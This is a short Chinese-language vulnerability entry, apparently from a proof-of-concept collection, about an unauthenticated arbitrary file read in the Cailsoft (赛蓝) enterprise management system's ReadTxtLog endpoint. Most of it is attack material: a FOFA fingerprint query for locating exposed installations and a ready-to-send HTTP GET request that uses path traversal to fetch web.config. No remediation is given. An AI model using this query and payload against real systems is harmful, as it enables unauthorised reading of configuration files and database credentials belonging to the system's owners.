# 赛蓝企业管理系统ReadTxtLog存在任意文件读取漏洞

赛蓝企业管理系统 ReadTxtLog 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```java
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```java
GET /BaseModule/SysLog/ReadTxtLog?FileName=../web.config HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: __RequestVerificationToken=EXiOGTuudShJEzYLR8AQgWCZbF2NB6_KXKrmqJJyp1cgyV6_LYy9yKQhNkHJGXXlbO_6NLQZPwUUdVZKH6e9KMuXyxV6Tg-w5Ftx-mKih3U1; ASP.NET_SessionId=2ofwed0gd2jc4paj0an0hpcl
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

